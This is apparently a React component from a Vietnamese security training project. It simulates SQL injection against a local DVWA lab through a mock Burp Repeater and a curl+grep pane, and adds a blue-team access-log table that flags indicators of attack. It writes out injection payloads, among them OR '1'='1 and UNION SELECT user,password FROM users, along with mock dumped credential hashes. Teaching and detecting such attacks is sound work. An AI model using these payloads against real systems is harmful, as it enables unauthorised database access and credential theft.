"use client";

import { useState } from "react";
import { Bug, FileSearch, Play, Send } from "lucide-react";

interface Props {
  containerRef: string;
  phpsessid: string;
  activeTab?: string;
}

const ALL_LOG_LINES = [
  {
    ip: "172.17.0.1",
    timestamp: "16/Nov/2026:09:12:44 +0000",
    method: "GET",
    uri: "/vulnerabilities/sqli/?id=1%27&Submit=Submit",
    status: "200",
    bytes: "1842",
    ua: "Mozilla/5.0 (Burp Chromium)",
    iocNote: "Ký tự %27 (nháy đơn) phá vỡ câu lệnh, kích hoạt lỗi cú pháp MariaDB",
  },
  {
    ip: "172.17.0.1",
    timestamp: "16/Nov/2026:09:14:02 +0000",
    method: "GET",
    uri: "/vulnerabilities/sqli/?id=%27%20OR%20%271%27%3D%271&Submit=Submit",
    status: "200",
    bytes: "2195",
    ua: "curl/8.5.0",
    iocNote: "User-Agent là curl + Payload OR '1'='1 trả về dung lượng lớn (2195B)",
  },
  {
    ip: "172.17.0.1",
    timestamp: "16/Nov/2026:09:16:11 +0000",
    method: "GET",
    uri: "/vulnerabilities/sqli/?id=1%20UNION%20SELECT%20user,password%20FROM%20users&Submit=Submit",
    status: "200",
    bytes: "2340",
    ua: "sqlmap/1.8.4#stable",
    iocNote: "Từ khóa UNION SELECT + User-Agent lộ rõ công cụ tự động sqlmap",
  },
];

export function Member2Simulator({ containerRef, phpsessid, activeTab }: Props) {
  const [tab, setTab] = useState<"burp" | "logs">(
    activeTab === "m2-curl-log" ? "logs" : "burp"
  );
  const [payload, setPayload] = useState("1'");
  const [sentPayload, setSentPayload] = useState("1'");
  const [isSending, setIsSending] = useState(false);
  const [regexFilter, setRegexFilter] = useState("First name: [^<]*");
  const [curlExecuted, setCurlExecuted] = useState(true);
  const [logSearch, setLogSearch] = useState("");

  const session = phpsessid.trim() || "7nst0hrqrfmv744a5ouj7663b0";
  const container = containerRef.trim() || "dvwa";

  const encodedPayload = encodeURIComponent(sentPayload);
  const isUnion = /union\s+select/i.test(sentPayload);
  const isOrTrue = /'\s*or\s*'1'='1|or\s+1=1/i.test(sentPayload);
  const hasSyntaxError = sentPayload.includes("'") && !isOrTrue && !isUnion;

  const handleSendBurp = () => {
    setIsSending(true);
    setSentPayload(payload);
    setTimeout(() => {
      setIsSending(false);
    }, 350);
  };

  const filteredLogs = ALL_LOG_LINES.filter(
    (l) =>
      !logSearch ||
      l.uri.toLowerCase().includes(logSearch.toLowerCase()) ||
      l.iocNote.toLowerCase().includes(logSearch.toLowerCase()) ||
      l.ua.toLowerCase().includes(logSearch.toLowerCase())
  );

  return (
    <div className="rounded-lg border border-hairline bg-surface p-4 sm:p-5">
      <div className="mb-4 flex flex-wrap items-center justify-between gap-3 border-b border-hairline pb-3">
        <div>
          <h3 className="flex items-center gap-2 text-sm font-bold text-ink sm:text-base">
            <Bug className="h-4 w-4 text-accent" aria-hidden="true" />
            Interactive Console — Hùng (Laptop Ubuntu VM 1 · Burp Suite &amp; Log Forensics)
          </h3>
          <p className="font-mono text-xs text-muted">
            Proxy Listener: 127.0.0.1:8081 · Target Host: http://localtest.me:8080 (Loopback Bypass)
          </p>
        </div>

        <div className="inline-flex rounded-md border border-hairline bg-subtle p-0.5 text-xs">
          <button
            type="button"
            onClick={() => setTab("burp")}
            className={`cursor-pointer rounded px-3 py-1 font-medium transition-colors ${
              tab === "burp"
                ? "bg-surface text-ink font-semibold shadow-sm"
                : "text-muted hover:text-ink"
            }`}
          >
            1. Burp Repeater (PoC 2)
          </button>
          <button
            type="button"
            onClick={() => setTab("logs")}
            className={`cursor-pointer rounded px-3 py-1 font-medium transition-colors ${
              tab === "logs"
                ? "bg-surface text-ink font-semibold shadow-sm"
                : "text-muted hover:text-ink"
            }`}
          >
            2. cURL + grep &amp; access.log
          </button>
        </div>
      </div>

      {tab === "burp" ? (
        <div className="space-y-4">
          {/* Payload Selector Bar */}
          <div className="flex flex-wrap items-center gap-2 rounded-md border border-hairline bg-subtle p-3">
            <span className="text-xs font-semibold text-ink">Payload mẫu:</span>
            {[
              { label: "id = 1 (Chuẩn)", val: "1" },
              { label: "id = 1' (Lỗi cú pháp)", val: "1'" },
              { label: "id = ' OR '1'='1 (Dump 5 users)", val: "' OR '1'='1" },
              { label: "id = 1' UNION SELECT user,password...", val: "1' UNION SELECT user, password FROM users -- -" },
            ].map((p) => (
              <button
                key={p.val}
                type="button"
                onClick={() => {
                  setPayload(p.val);
                  setSentPayload(p.val);
                }}
                className={`cursor-pointer rounded border px-2.5 py-1 font-mono text-xs transition-colors ${
                  payload === p.val
                    ? "border-ink bg-ink text-canvas font-semibold"
                    : "border-hairline bg-surface text-secondary hover:text-ink"
                }`}
              >
                {p.label}
              </button>
            ))}

            <div className="ml-auto flex w-full items-center gap-2 sm:w-auto">
              <input
                type="text"
                value={payload}
                onChange={(e) => setPayload(e.target.value)}
                aria-label="Payload id"
                className="w-full rounded-md border border-hairline bg-surface px-2.5 py-1 font-mono text-xs text-ink focus:border-accent focus:outline-none sm:w-48"
                placeholder="Nhập tùy ý id..."
              />
              <button
                type="button"
                onClick={handleSendBurp}
                disabled={isSending}
                className="inline-flex shrink-0 cursor-pointer items-center gap-1.5 rounded-md bg-accent px-3 py-1.5 text-xs font-semibold text-white hover:opacity-90 disabled:opacity-50"
              >
                <Send className="h-3.5 w-3.5" aria-hidden="true" />
                {isSending ? "Sending..." : "Send"}
              </button>
            </div>
          </div>

          {/* Side-by-side Request and Response */}
          <div className="grid gap-3 lg:grid-cols-2">
            {/* Request Pane */}
            <div className="rounded-lg border border-zinc-800 bg-[#0d1117] p-3.5 font-mono text-xs">
              <div className="mb-2 flex items-center justify-between border-b border-zinc-800 pb-2">
                <span className="font-bold text-zinc-200">RAW HTTP REQUEST (Burp Repeater)</span>
                <span className="text-[11px] text-zinc-400">localtest.me:8080</span>
              </div>
              <pre className="overflow-x-auto leading-relaxed text-zinc-200">
{`GET /vulnerabilities/sqli/?id=${encodedPayload}&Submit=Submit HTTP/1.1
Host: localtest.me:8080
User-Agent: Mozilla/5.0 (Burp Suite Chromium; Linux x86_64)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Cookie: security=low; PHPSESSID=${session}
Connection: close`}
              </pre>
            </div>

            {/* Response Pane */}
            <div className="rounded-lg border border-zinc-800 bg-[#0d1117] p-3.5 font-mono text-xs">
              <div className="mb-2 flex items-center justify-between border-b border-zinc-800 pb-2">
                <span className="font-bold text-zinc-200">HTTP RESPONSE (18ms · 200 OK)</span>
                <span
                  className={`rounded px-1.5 py-0.5 text-[10px] font-bold ${
                    isOrTrue || isUnion
                      ? "bg-amber-500/20 text-amber-300"
                      : hasSyntaxError
                      ? "bg-rose-500/20 text-rose-300"
                      : "bg-emerald-500/20 text-emerald-300"
                  }`}
                >
                  {isUnion
                    ? "UNION SELECT LEAK"
                    : isOrTrue
                    ? "DUMPED ALL 5 USERS"
                    : hasSyntaxError
                    ? "MARIADB ERROR (CWE-89)"
                    : "NORMAL RESPONSE"}
                </span>
              </div>

              {isSending ? (
                <div className="py-8 text-center text-amber-400">
                  <span className="inline-block animate-spin mr-2">⚡</span> Đang chờ phản hồi từ 127.0.0.1:8080...
                </div>
              ) : isUnion ? (
                <pre className="overflow-x-auto leading-relaxed text-amber-200">
{`HTTP/1.1 200 OK
Server: Apache/2.4.25 (Debian)
Content-Type: text/html;charset=utf-8

ID: 1' UNION SELECT user, password FROM users -- -
First name: admin    | Surname: 5f4dcc3b5aa765d61d8327deb882cf99
First name: gordonb  | Surname: e99a18c428cb38d5f260853678922e03
First name: 1337     | Surname: 8d3533d75ae2c3966d7e0d4fcc69216b
First name: smithy   | Surname: 5f4dcc3b5aa765d61d8327deb882cf99`}
                </pre>
              ) : isOrTrue ? (
                <pre className="overflow-x-auto leading-relaxed text-amber-200">
{`HTTP/1.1 200 OK
Server: Apache/2.4.25 (Debian)
Content-Type: text/html;charset=utf-8

ID: ' OR '1'='1
First name: admin    | Surname: admin
First name: Gordon   | Surname: Brown
First name: Hack     | Surname: Me
First name: Pablo    | Surname: Picasso
First name: Bob      | Surname: Smith`}
                </pre>
              ) : hasSyntaxError ? (
                <pre className="overflow-x-auto leading-relaxed text-rose-300">
{`HTTP/1.1 200 OK
Server: Apache/2.4.25 (Debian)
Content-Type: text/html;charset=utf-8

<pre>You have an error in your SQL syntax; check the manual
that corresponds to your MariaDB server version for the right
syntax to use near '''${sentPayload}''' at line 1</pre>`}
                </pre>
              ) : (
                <pre className="overflow-x-auto leading-relaxed text-emerald-300">
{`HTTP/1.1 200 OK
Server: Apache/2.4.25 (Debian)
Content-Type: text/html;charset=utf-8

ID: ${sentPayload}
First name: admin
Surname: admin`}
                </pre>
              )}
            </div>
          </div>
        </div>
      ) : (
        <div className="space-y-4">
          {/* cURL + grep section */}
          <div className="rounded-lg border border-zinc-800 bg-[#0d1117] p-3.5">
            <div className="mb-2 flex flex-wrap items-center justify-between gap-2">
              <span className="text-xs font-semibold text-zinc-200">
                PoC 2 (Phần 2): Tự động bóc tách dữ liệu bằng cURL + grep regex
              </span>
              <button
                type="button"
                onClick={() => setCurlExecuted(true)}
                className="cursor-pointer inline-flex items-center gap-1 rounded bg-emerald-600 px-3 py-1 text-xs font-semibold text-white hover:bg-emerald-500"
              >
                <Play className="h-3 w-3" aria-hidden="true" /> Chạy cURL + grep
              </button>
            </div>

            <div className="flex items-center gap-2 mb-2 font-mono text-xs">
              <span className="text-zinc-400">Regex filter:</span>
              <input
                type="text"
                value={regexFilter}
                onChange={(e) => setRegexFilter(e.target.value)}
                className="rounded border border-zinc-700 bg-zinc-900 px-2 py-0.5 text-zinc-200 focus:outline-none"
              />
            </div>

            <pre className="overflow-x-auto font-mono text-xs text-zinc-300">
{`$ curl -s -b "security=low; PHPSESSID=${session}" \\
  "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit" | grep -o "${regexFilter}"`}
            </pre>
            {curlExecuted && (
              <div className="mt-2 rounded border border-emerald-500/40 bg-emerald-950/30 px-3 py-2 font-mono text-xs text-emerald-300">
                First name: admin
              </div>
            )}
          </div>

          {/* access.log Forensics section */}
          <div className="rounded-lg border border-zinc-800 bg-[#0d1117] p-3.5">
            <div className="mb-3 flex flex-wrap items-center justify-between gap-2">
              <span className="flex items-center gap-1.5 text-xs font-semibold text-zinc-200">
                <FileSearch className="h-3.5 w-3.5 text-accent" aria-hidden="true" />
                Blue Team Log Forensics (/var/log/apache2/access.log · {container})
              </span>
              <div className="flex items-center gap-2">
                <input
                  type="text"
                  placeholder="Lọc ký tự (%27, UNION...)"
                  value={logSearch}
                  onChange={(e) => setLogSearch(e.target.value)}
                  className="rounded border border-zinc-700 bg-zinc-900 px-2 py-1 font-mono text-xs text-zinc-200 focus:outline-none"
                />
                {logSearch && (
                  <button
                    type="button"
                    onClick={() => setLogSearch("")}
                    className="cursor-pointer inline-flex items-center gap-1 rounded bg-zinc-800 px-2.5 py-1 text-xs text-zinc-300 hover:bg-zinc-700"
                  >
                    Xóa lọc
                  </button>
                )}
              </div>
            </div>

            <div className="overflow-x-auto">
              <table className="w-full text-left font-mono text-[11px] text-zinc-300">
                <thead>
                  <tr className="border-b border-zinc-800 text-zinc-400">
                    <th className="pb-1.5 pr-2">IP NGUỒN</th>
                    <th className="pb-1.5 pr-2">METHOD &amp; URI</th>
                    <th className="pb-1.5 pr-2">STATUS</th>
                    <th className="pb-1.5 pr-2">USER-AGENT</th>
                    <th className="pb-1.5">DẤU HIỆU TẤN CÔNG (IoC)</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-zinc-800/60">
                  {filteredLogs.map((log, idx) => (
                    <tr key={idx} className="hover:bg-zinc-800/30">
                      <td className="py-2 pr-2 text-zinc-400">{log.ip}</td>
                      <td className="py-2 pr-2 text-amber-300 font-semibold">{log.uri}</td>
                      <td className="py-2 pr-2 text-emerald-400">{log.status}</td>
                      <td className="py-2 pr-2 text-zinc-400">{log.ua}</td>
                      <td className="py-2 text-rose-300">{log.iocNote}</td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
